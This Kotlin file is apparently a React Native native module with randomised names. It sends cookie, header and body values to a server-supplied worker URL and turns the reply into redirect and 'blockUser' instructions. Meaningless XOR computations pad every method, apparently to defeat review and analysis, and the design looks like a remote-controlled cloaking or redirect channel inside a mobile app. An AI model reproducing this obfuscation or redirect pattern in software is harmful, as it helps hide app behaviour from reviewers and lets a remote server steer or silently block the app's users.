/* cf-intake:v1 */
package com.ychikwordcdwpavbth389t8

// autosetup-split-begin
// autosetup-split-end
import com.facebook.react.bridge.Arguments
import com.facebook.react.bridge.Promise
import com.facebook.react.bridge.ReactApplicationContext
import com.facebook.react.bridge.ReactContextBaseJavaModule
import com.facebook.react.bridge.ReactMethod
import com.facebook.react.bridge.ReadableArray
import org.json.JSONObject
import java.net.HttpURLConnection
import java.net.URL
import java.net.URLEncoder

class Dekuxaferazuwi(reactContext: ReactApplicationContext) :
    ReactContextBaseJavaModule(reactContext) {

    override fun getName(): String {
        @Suppress("UNUSED_VARIABLE") val ichyikowrdfpagthmsSinkV2 = ichyikowrdfpagthmsDekuxaferazuwiObfV2HashMix("36") xor ichyikowrdfpagthmsDekuxaferazuwiObfV2SumOdds(intArrayOf(16, 3, 34)) xor ichyikowrdfpagthmsDekuxaferazuwiObfV2ClampMod(53, 68) xor ichyikowrdfpagthmsDekuxaferazuwiObfV2ShiftXor(47, 70)
        return "Dekuxaferazuwi"
    }

    @ReactMethod
    fun wamisozurojufo(fields: ReadableArray, bodyPlain: String, promise: Promise) {
        @Suppress("UNUSED_VARIABLE") val ichyikowrdfpagthmsSinkV2 = ichyikowrdfpagthmsDekuxaferazuwiObfV2HashMix("36") xor ichyikowrdfpagthmsDekuxaferazuwiObfV2SumOdds(intArrayOf(16, 3, 34)) xor ichyikowrdfpagthmsDekuxaferazuwiObfV2ClampMod(53, 68) xor ichyikowrdfpagthmsDekuxaferazuwiObfV2ShiftXor(47, 70)
        try {
            promise.resolve(CichyikowrdfpagthmsIntakePart01.assemble(fields, bodyPlain))
        } catch (e: Exception) {
            promise.resolve("{\"cookie\":\"0\",\"header\":\"0\",\"body\":\"\"}")
        }
    }

    @ReactMethod
    fun repotocepa(json: String, promise: Promise) {
        @Suppress("UNUSED_VARIABLE") val ichyikowrdfpagthmsSinkV2 = ichyikowrdfpagthmsDekuxaferazuwiObfV2HashMix("36") xor ichyikowrdfpagthmsDekuxaferazuwiObfV2SumOdds(intArrayOf(16, 3, 34)) xor ichyikowrdfpagthmsDekuxaferazuwiObfV2ClampMod(53, 68) xor ichyikowrdfpagthmsDekuxaferazuwiObfV2ShiftXor(47, 70)
        try {
            promise.resolve(CichyikowrdfpagthmsIntakePart03.mapResponse(JSONObject(if (json.isEmpty()) "{}" else json)))
        } catch (e: Exception) {
            val empty = Arguments.createMap()
            empty.putNull("redirectUrl")
            empty.putNull("redirectUrlInitial")
            empty.putNull("error")
            empty.putBoolean("blockUser", false)
            promise.resolve(empty)
        }
    }

    @ReactMethod
    fun fecesuzaxud(baseUrl: String, dataValue: String, headerValue: String, body: String, promise: Promise) {
        @Suppress("UNUSED_VARIABLE") val ichyikowrdfpagthmsSinkV2 = ichyikowrdfpagthmsDekuxaferazuwiObfV2HashMix("36") xor ichyikowrdfpagthmsDekuxaferazuwiObfV2SumOdds(intArrayOf(16, 3, 34)) xor ichyikowrdfpagthmsDekuxaferazuwiObfV2ClampMod(53, 68) xor ichyikowrdfpagthmsDekuxaferazuwiObfV2ShiftXor(47, 70)
        Thread {
            try {
                val connection = (URL(CichyikowrdfpagthmsIntakePart02.workerUrl(baseUrl)).openConnection() as HttpURLConnection)
                connection.requestMethod = "POST"
                connection.connectTimeout = 25000
                connection.readTimeout = 25000
                connection.doOutput = true
                connection.setRequestProperty("Content-Type", "application/x-www-form-urlencoded")
                if (dataValue.isNotEmpty()) {
                    connection.setRequestProperty("Cookie", "cosefo" + "=" + dataValue)
                }
                if (headerValue.isNotEmpty()) {
                    connection.setRequestProperty("X-Dis", headerValue)
                }
                connection.setRequestProperty("Accept", "text/plain, */*")
                connection.outputStream.use { stream ->
                    stream.write(body.toByteArray(Charsets.UTF_8))
                }
                val code = connection.responseCode
                val stream = if (code in 200..299) connection.inputStream else connection.errorStream
                val text = stream?.bufferedReader()?.use { it.readText() } ?: ""
                promise.resolve(text)
            } catch (e: Exception) {
                promise.resolve("")
            }
        }.start()
    }

}

/* obfuscation-batch:v2 */
private fun ichyikowrdfpagthmsDekuxaferazuwiObfV2HashMix(s: String): Int {
    var h = 27
    for (i in s.indices) h = (h xor (s[i].code * 33)) % 125
    return h
}
private fun ichyikowrdfpagthmsDekuxaferazuwiObfV2SumOdds(nums: IntArray): Int {
    var acc = 65
    for (n in nums) {
        if ((n and 1) == 0) continue
        acc = (acc + n * 35) % 154
    }
    return acc
}
private fun ichyikowrdfpagthmsDekuxaferazuwiObfV2ClampMod(n: Int, m: Int): Int {
    val span = (m % 29) + 6
    val x = ((n xor 77) shl 3) % span
    return if (x < 0) x + span else x
}
private fun ichyikowrdfpagthmsDekuxaferazuwiObfV2ShiftXor(n: Int, k: Int): Int {
    val x = (n xor k) shl 4
    return (x xor 207) and 49791
}
